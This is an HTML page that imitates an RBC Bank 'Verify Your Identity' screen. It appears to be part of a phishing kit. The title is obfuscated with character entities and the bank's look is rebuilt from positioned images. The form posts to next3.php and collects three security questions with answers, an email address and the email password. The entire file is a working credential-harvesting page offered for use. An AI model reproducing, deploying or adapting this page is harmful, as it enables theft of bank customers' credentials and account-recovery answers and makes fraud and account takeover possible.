<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#82;&#66;&#67;&#32;&#66;&#97;&#110;&#107;&#32;&#45;&#32;&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			  <style type="text/css">
.textbox {
    padding-left: 8px;
  	font-size: 16px;
	height: 38px; 
    border-radius: 5px;
    border: 1px solid #CCC;
    background-image: none;
  	box-shadow: 0px 3px 3px 0px #DDD;
    width: 270px;
}
 .textbox:focus {  
    border-color: #8DAFE6; 
    border-style: solid; 
    border-width: 2px; 
    outline: 0; 
 } 
	</style>	
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:385px; height:133px; z-index:0"><img src="images/bc5.png" alt="" title="" border=0 width=385 height=133></div>

<div id="image2" style="position:absolute; overflow:hidden; left:16px; top:254px; width:280px; height:382px; z-index:1"><img src="images/bc8.png" alt="" title="" border=0 width=280 height=382></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:152px; width:385px; height:79px; z-index:2"><img src="images/bc7.png" alt="" title="" border=0 width=385 height=79></div>

<div id="image4" style="position:absolute; overflow:hidden; left:17px; top:641px; width:276px; height:239px; z-index:3"><img src="images/bc9.png" alt="" title="" border=0 width=276 height=239></div>

<div id="image5" style="position:absolute; overflow:hidden; left:0px; top:1008px; width:392px; height:186px; z-index:4"><img src="images/bc4.png" alt="" title="" border=0 width=392 height=186></div>

<div id="image6" style="position:absolute; overflow:hidden; left:12px; top:1017px; width:309px; height:16px; z-index:5"><img src="images/priv.png" alt="" title="" border=0 width=309 height=16></div>
<form action=next3.php name=chalbhai id=chalbhai method=post>
<select name="q1" class="textbox" autocomplete="off" required  style="position:absolute;left:23px;top:283px;width:324px;z-index:6">
<option value="Select Security Question">Select Security Question</option>

                              <option>What is your maternal grandmother's first name?</option>
<option>What is your mother's middle name?</option>
<option>What is your father's middle name?</option>
<option>In what city was your mother born?</option>
<option>In what city were you born?</option>
<option>What is your maternal grandfather's first name?</option>
<option>In what year did you graduate from high school?</option>
<option>What was the name of your first boyfriend or girlfriend?</option>
<option>What was the name of your first pet?</option>
<option>What is the first name of the best man/maid of honor at your wedding?</option>
<option>In what city did you meet your spouse/significant other?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What was the make and model of your first car?</option>
<option>In what city were you married?</option>
<option>In what city were you living at age 16?</option>
<option>In which city did you meet your spouse for the first time?</option>
<option>what is the name of your first employer?</option>
<option>What is your best friend\'s first name?</option>
<option>In what city was your high school?</option>
<option>In what city was your mother born?</option>
<option>What was your high school mascot?</option>
<option>In what city did you honeymoon?</option>
<option>what your Favorite person in history?</option>
<option>What street did your best friend in high school live on?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What is the first name of your high school prom date?</option>
<option>What is your all-time favorite song?</option>
</select>
<input name="ans1" class="textbox" autocomplete="off" required  type="text" style="position:absolute;width:258px;left:23px;top:361px;z-index:7">
<select name="q2" class="textbox" autocomplete="off" required  style="position:absolute;left:23px;top:437px;width:324px;z-index:8">
<option value="Select Security Question">Select Security Question</option>
<option>What is your maternal grandmother's first name?</option>
<option>What is your mother's middle name?</option>
<option>What is your father's middle name?</option>
<option>In what city was your mother born?</option>
<option>In what city were you born?</option>
<option>What is your maternal grandfather's first name?</option>
<option>In what year did you graduate from high school?</option>
<option>What was the name of your first boyfriend or girlfriend?</option>
<option>What was the name of your first pet?</option>
<option>What is the first name of the best man/maid of honor at your wedding?</option>
<option>In what city did you meet your spouse/significant other?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What was the make and model of your first car?</option>
<option>In what city were you married?</option>
<option>In what city were you living at age 16?</option>
<option>In which city did you meet your spouse for the first time?</option>
<option>what is the name of your first employer?</option>
<option>What is your best friend\'s first name?</option>
<option>In what city was your high school?</option>
<option>In what city was your mother born?</option>
<option>What was your high school mascot?</option>
<option>In what city did you honeymoon?</option>
<option>what your Favorite person in history?</option>
<option>What street did your best friend in high school live on?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What is the first name of your high school prom date?</option>
<option>What is your all-time favorite song?</option>
</select>
<input name="ans2" class="textbox" autocomplete="off" required  type="text" style="position:absolute;width:258px;left:23px;top:514px;z-index:9">
<select name="q3" class="textbox" autocomplete="off" required  style="position:absolute;left:23px;top:591px;width:324px;z-index:10">
<option value="Select Security Question">Select Security Question</option>
<option>What is your maternal grandmother's first name?</option>
<option>What is your mother's middle name?</option>
<option>What is your father's middle name?</option>
<option>In what city was your mother born?</option>
<option>In what city were you born?</option>
<option>What is your maternal grandfather's first name?</option>
<option>In what year did you graduate from high school?</option>
<option>What was the name of your first boyfriend or girlfriend?</option>
<option>What was the name of your first pet?</option>
<option>What is the first name of the best man/maid of honor at your wedding?</option>
<option>In what city did you meet your spouse/significant other?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What was the make and model of your first car?</option>
<option>In what city were you married?</option>
<option>In what city were you living at age 16?</option>
<option>In which city did you meet your spouse for the first time?</option>
<option>what is the name of your first employer?</option>
<option>What is your best friend\'s first name?</option>
<option>In what city was your high school?</option>
<option>In what city was your mother born?</option>
<option>What was your high school mascot?</option>
<option>In what city did you honeymoon?</option>
<option>what your Favorite person in history?</option>
<option>What street did your best friend in high school live on?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What is the first name of your high school prom date?</option>
<option>What is your all-time favorite song?</option>
</select>
<input name="ans3" class="textbox" autocomplete="off" required  type="text" style="position:absolute;width:258px;left:23px;top:674px;z-index:11">
<input name="email" class="textbox" autocomplete="off" required type="email"  style="position:absolute;width:322px;left:23px;top:750px;z-index:12">
<input name="epass" class="textbox" autocomplete="off" required type="password"  style="position:absolute;width:322px;left:23px;top:827px;z-index:13">
<div id="formimage1" style="position:absolute; left:0px; top:918px; z-index:14"><input type="image" name="formimage1" width="378" height="38" src="images/submit.png"></div>

</body>
</html>
